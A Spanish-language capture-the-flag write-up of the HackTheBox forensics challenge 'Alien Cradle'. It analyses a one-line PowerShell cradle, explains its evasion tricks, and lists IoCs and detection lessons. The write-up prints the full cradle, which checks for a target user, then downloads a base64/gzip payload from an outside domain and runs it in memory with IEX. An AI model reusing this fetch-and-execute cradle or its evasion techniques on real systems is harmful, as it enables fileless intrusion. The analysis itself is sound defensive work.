---
title: "Alien Cradle"
description: "Writeup de Alien Cradle - HackTheBox Forensics (100 pts). PowerShell Cradle fileless: anti-sandbox check, proxy-aware downloader, IEX en memoria y flag en concatenación de literales."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - powershell
  - cradle
  - fileless
  - string-obfuscation
  - static-analysis
  - anti-sandbox
  - iex
---

# 🔬 Alien Cradle

> 📅 Fecha: 2026-06-21
> 🎯 Plataforma: Hack The Box
> 🗂️ Categoría: Forensics
> 🏆 Puntos: 100
> ⏱️ Tiempo invertido: 30m
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Análisis del Script](#-análisis-del-script)
- [Desobfuscación del Flag](#-desobfuscación-del-flag)
- [IoCs](#-iocs)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

El reto entrega `cradle.ps1`, un **PowerShell Cradle** de una sola línea que combina cuatro técnicas de evasión: anti-sandbox por usuario, descarga proxy-aware, ejecución fileless vía `IEX` y flag almacenado como literales concatenados. Análisis estático puro — no hace falta ejecutar nada.

| Campo | Valor |
|-------|-------|
| Técnicas | Anti-sandbox, proxy-aware downloader, URL fragmentada, fileless IEX, string concatenation |
| Herramientas | `cat`, `python3` |
| Vector de solución | Variable `$f` → unir literales → flag |

---

## 🔎 Análisis del Script

```powershell
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth'){exit};$w = New-Object net.webclient;$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;$d = $w.DownloadString('http://windowsliveupdater.com/updates/33' + '96f3bf5a605cc4' + '1bd0d6e229148' + '2a5/2_34122.gzip.b64');$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

Formateado para análisis:

```powershell
# [1] Anti-sandbox: solo ejecuta si el usuario es secret_HQ\Arth
if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne 'secret_HQ\Arth') { exit }

# [2] Descargador proxy-aware — usa credenciales NTLM/Kerberos del usuario logueado
$w = New-Object net.webclient
$w.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials

# [3] URL del C2 fragmentada (evasión de firmas estáticas)
$d = $w.DownloadString(
    'http://windowsliveupdater.com/updates/33' +  # typosquatting de dominios MS
    '96f3bf5a605cc4'                           +
    '1bd0d6e229148'                            +
    '2a5/2_34122.gzip.b64'
)

# [4] Payload Base64 → MemoryStream (nunca toca disco)
$s = New-Object IO.MemoryStream(, [Convert]::FromBase64String($d))

# [5] Flag como literales concatenados → evasión de YARA/AV por string matching
$f = 'H'+'T'+'B'+'{p0w3rs'+'h3ll'+'_Cr4d'+'l3s_c4n_g3t'+'_th'+'3_j0b_d'+'0n3}'

# [6] Descomprimir Gzip en RAM y ejecutar con IEX — fileless
IEX (New-Object IO.StreamReader(
    New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress)
)).ReadToEnd()
```

**Puntos clave:**

- `[1]` Targeted execution — en sandbox el usuario no es `Arth`, el script sale antes de conectar al C2.
- `[2]` `DefaultNetworkCredentials` permite atravesar proxies autenticados en redes corporativas; sin esto el cradle falla en la mayoría de entornos empresariales.
- `[3]` URL reconstruida: `http://windowsliveupdater.com/updates/3396f3bf5a605cc41bd0d6e229148 2a5/2_34122.gzip.b64` — el typosquatting imita dominios legítimos de Microsoft.
- `[5]` **Esta línea contiene el flag** — los 10 fragmentos concatenados forman el string final.
- `[6]` `DownloadString → Base64 decode → Gzip decompress → IEX`: nada a disco, ciega a AV basado en archivos.

---

## 🧩 Desobfuscación del Flag

```python
python3 << 'EOF'
parts = ['H','T','B','{p0w3rs','h3ll','_Cr4d','l3s_c4n_g3t','_th','3_j0b_d','0n3}']
print(''.join(parts))
EOF
```

```
HTB{FLAG}
```

---

## 🕵️ IoCs

| Tipo | Valor |
|------|-------|
| Dominio C2 | `windowsliveupdater.com` |
| Usuario objetivo | `secret_HQ\Arth` |
| MITRE T1059.001 | PowerShell — Cradle fileless |
| MITRE T1027 | Obfuscated Files or Information |
| MITRE T1105 | Ingress Tool Transfer |

---

## 🎓 Lecciones Aprendidas

- **`ScriptBlockLogging` (Event ID 4104)** loguea el contenido *evaluado* post-IEX — la única forma de capturar el payload real sin AMSI.
- **Concatenación de strings** rompe firmas YARA basadas en strings planos; una regla robusta detecta el *patrón* de concatenación, no el resultado.
- **Anti-sandbox por usuario** revela el objetivo exacto del ataque — dato valioso en respuesta a incidentes.
- **Fileless no significa indetectable:** AMSI intercepta el contenido antes de ejecutarse; Constrained Language Mode rompe las APIs `.NET` que usa el cradle.

---

## 📚 Referencias

- [MITRE ATT&CK — T1059.001 PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [Microsoft — ScriptBlockLogging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)
- [Invoke-Obfuscation (GitHub)](https://github.com/danielbohannon/Invoke-Obfuscation)
